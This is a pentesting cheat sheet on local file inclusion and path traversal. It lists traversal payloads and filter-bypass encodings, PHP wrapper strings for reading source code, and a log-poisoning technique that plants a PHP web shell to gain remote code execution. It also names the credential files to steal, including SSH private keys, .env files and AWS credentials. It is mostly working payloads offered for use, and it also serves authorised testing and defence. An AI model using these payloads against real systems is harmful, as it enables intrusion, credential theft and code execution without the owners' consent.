## LFI / Path Traversal / File Read
Where: file/page/template/include/download/lang/theme params, `?file=`, `?page=`, image/attachment servers, log/report viewers.
Traversal: `../../../../etc/passwd`, absolute `/etc/passwd`, encoded `%2e%2e%2f`, double `%252e%252e%252f`, overlong UTF-8, `....//` (filter strips one `../`), null byte `%00` (old PHP), trailing `?`/`#`.
Wrappers (PHP LFI -> source/RCE): `php://filter/convert.base64-encode/resource=index.php` (read source), `php://filter/read=string.rot13/...`, `data://text/plain;base64,<b64 php>`, `expect://id`, `phar://` deserialization, `zip://`.
LFI -> RCE: poison a log then include it (`/var/log/apache2/access.log` with `<?php system($_GET[c]);?>` in User-Agent), `/proc/self/environ`, PHP session files `/var/lib/php/sessions/sess_<PHPSESSID>`, uploaded file, `/proc/self/fd/N`, mail.
Windows: `..\..\..\windows\win.ini`, `C:\windows\system32\drivers\etc\hosts`.
High-value reads: `/etc/passwd`, app config/`.env`, `/root/.ssh/id_rsa`, source (`index.php`, settings), cloud creds `~/.aws/credentials`, `/proc/self/cmdline`.
Escalate: source disclosure -> find secrets/other bugs; log poison / session -> RCE.
